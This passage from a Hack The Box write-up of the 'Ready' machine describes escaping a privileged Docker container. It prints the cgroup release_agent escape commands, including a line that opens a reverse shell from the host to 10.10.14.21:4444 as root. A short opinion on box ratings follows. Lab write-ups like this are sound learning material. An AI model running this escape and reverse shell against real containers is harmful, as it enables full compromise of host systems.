<span class="mi">8</span><span class="err">:</span><span class="n">cpu</span><span class="p">,</span><span class="nl">cpuacct</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
<span class="mi">7</span><span class="err">:</span><span class="nl">hugetlb</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
<span class="mi">6</span><span class="err">:</span><span class="nl">pids</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
<span class="mi">5</span><span class="err">:</span><span class="nl">freezer</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
<span class="mi">4</span><span class="err">:</span><span class="nl">devices</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
<span class="mi">3</span><span class="err">:</span><span class="nl">rdma</span><span class="p">:</span><span class="o">/</span><span class="w"></span>
<span class="mi">2</span><span class="err">:</span><span class="nl">cpuset</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
<span class="mi">1</span><span class="err">:</span><span class="n">name</span><span class="o">=</span><span class="nl">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
<span class="mi">0</span><span class="o">::/</span><span class="k">system</span><span class="p">.</span><span class="n">slice</span><span class="o">/</span><span class="n">containerd</span><span class="p">.</span><span class="n">service</span><span class="w"></span>
</code></pre>
</div>
<p>
 As I thought, I was trapped in a Docker container.
</p>
<p>
 However, it is not a very secure container since I noticed from
 <code>
  /opt/backup/docker-compose.yml
 </code>
 that the container is running with the
 <em>
  privileged
 </em>
 flag on.
</p>
<div class="codehilite">
 <pre><span></span><code><span class="n">root</span><span class="nv">@gitlab</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="ss">"privileged"</span><span class="w"> </span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="k">backup</span><span class="o">/</span><span class="n">docker</span><span class="o">-</span><span class="n">compose</span><span class="p">.</span><span class="n">yml</span><span class="w"></span>
<span class="n">grep</span><span class="w"> </span><span class="ss">"privileged"</span><span class="w"> </span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="k">backup</span><span class="o">/</span><span class="n">docker</span><span class="o">-</span><span class="n">compose</span><span class="p">.</span><span class="n">yml</span><span class="w"></span>
<span class="w">    </span><span class="nl">privileged</span><span class="p">:</span><span class="w"> </span><span class="k">true</span><span class="w"></span>
</code></pre>
</div>
<p>
 We can escape from a Docker container if we have the following requirements
 <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-a-docker-container">
  using this PoC
 </a>
 .
</p>
<ul>
 <li>
  [x] We are the
  <code>
   root
  </code>
  user on the container.
 </li>
 <li>
  [x] The docker container is running with the
  <em>
   privileged
  </em>
  flag on.
 </li>
</ul>
<p>
 Oh guess what, we already have those requirements. Following the PoC I linked above I was able to get a reverse shell as the
 <code>
  root
 </code>
 user on the host machine.
</p>
<p>
 <em>
  Commmands
 </em>
</p>
<div class="codehilite">
 <pre><span></span><code>mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x
echo 1 &gt; /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" &gt; /tmp/cgrp/release_agent
echo '#!/bin/bash' &gt; /cmd
echo "bash -i &gt;&amp; /dev/tcp/10.10.14.21/4444 0&gt;&amp;1" &gt;&gt; /cmd
chmod a+x /cmd
sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"
head /output
</code></pre>
</div>
<p>
 <em>
  We are in!
 </em>
 <br/>
 <img alt="" class="center" src="/images/writeups/htb_machines/ready/gotactualroot.png"/>
</p>
<p>
 <em>
  Ignore my brainfart moment where I forget where
  <code>
   root.txt
  </code>
  was located...
 </em>
</p>
</div>
</div>
</section>
<section class="wrapper style6 alt">
<div class="inner">
<div class="content">

<h2 class="major" id="conclusion">
 Conclusion
</h2>
<p>
 Ready was an
 <em>
  alright
 </em>
 box in my opinion. It would of been a better box if the initial foothold did not involve GitLab, just like Laboratory that was released only a month before this one.
</p>
<p>
 I did notice that Laboratory and Ready both had the same underlying theme, and that is lying to us. Laboratory was rated as an easy box when it should of been rated as medium (meme below was made by me) and Ready was dishonest about getting root.
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/ready/bloodylaboratory.png"/>
</p>
<p>
 I honestly felt like the ratings for the boxes should of been flipped. Laboratory had a super cool yet difficult method to get initial foothold. Meanwhile, the initial vector for Ready was cool, but was not difficult to do.
</p>
<p>
 For Ready though, my favourite part was getting the user flag...
</p>
<p>
 <em>
  jk
 </em>
</p>
<p>
 It was actually escaping the Docker container, that was pretty neat and I quite enjoyed doing that.
</p>
<p>
 Hope you enjoyed reading this write up of mine, I will be doing more over the next few weeks so keep tuned!
</p></div>
</div>
</section>
</section>

    	</div>

    <!-- Footer -->
      <!-- Footer -->
  <section id="footer">
    <div class="inner">
      <ul class="icons">
        <li><a href="https://twitter.com/GhostCcamm" class="icon brands fa-twitter"><span class="label"></span></a></li>
        <li><a href="https://github.com/Ccamm" class="icon brands fa-github"><span class="label"></span></a></li>
      </ul>
    </div>
  </section>

		<!-- Particles -->
			<div id="particles-js"></div>

		<!-- Scripts -->
			<script src="/assets/js/jquery.min.js"></script>
			<script src="/assets/js/jquery.scrollex.min.js"></script>
			<script src="/assets/js/browser.min.js"></script>
			<script src="/assets/js/breakpoints.min.js"></script>
			<script src="/assets/js/util.js"></script>
			<script src="/assets/js/particles.min.js"></script>
			<script src="/assets/js/main.js"></script>
      
	</body>
</html>